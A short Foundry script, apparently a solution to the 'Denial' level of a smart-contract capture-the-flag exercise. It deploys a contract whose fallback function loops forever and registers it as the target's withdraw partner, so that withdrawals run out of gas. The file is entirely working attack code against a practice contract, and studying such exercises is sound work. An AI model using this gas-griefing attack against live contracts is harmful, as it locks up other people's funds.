// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}


contract Attack {
    fallback() external payable {
        while (true) {}
    }
}


contract DenialSolution is Script {

    function run() external {
        address target = 0xd50884526B7b4a1d46fdDe5b03376B905D0070Ff;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attacker = new Attack();

        IDenial(target).setWithdrawPartner(address(attacker));

        vm.stopBroadcast();
    }
}